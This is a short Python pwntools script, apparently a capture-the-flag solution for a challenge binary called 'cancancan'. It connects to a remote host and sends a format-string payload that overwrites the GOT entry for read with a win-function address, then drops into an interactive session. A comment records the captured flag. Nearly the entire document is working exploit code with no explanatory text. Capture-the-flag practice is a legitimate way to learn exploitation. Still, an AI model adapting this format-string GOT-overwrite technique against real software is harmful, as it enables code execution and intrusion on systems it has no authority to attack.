from pwn import *

DEBUG = False

if DEBUG:
    r = process("./cancancan")
    gdb.attach(r)
else:
    r = remote("35.246.42.94",31337)

r.recv()

read_got = 0x804c00c
win_addr2 = 0x9236 # read_got + 0
win_addr1 = 0x0804 # read_got + 2
# win_addr = 0x08049236
payload1 = p32(read_got) + p32(read_got + 2) + "%" + str(win_addr1-8) + "x%7$hn" + "%" + str(win_addr2-win_addr1) + "x%6$hn"
r.sendline(payload1)

r.interactive()

# flag: GrabCON{Byp4ss_can4ry_1s_fun!}


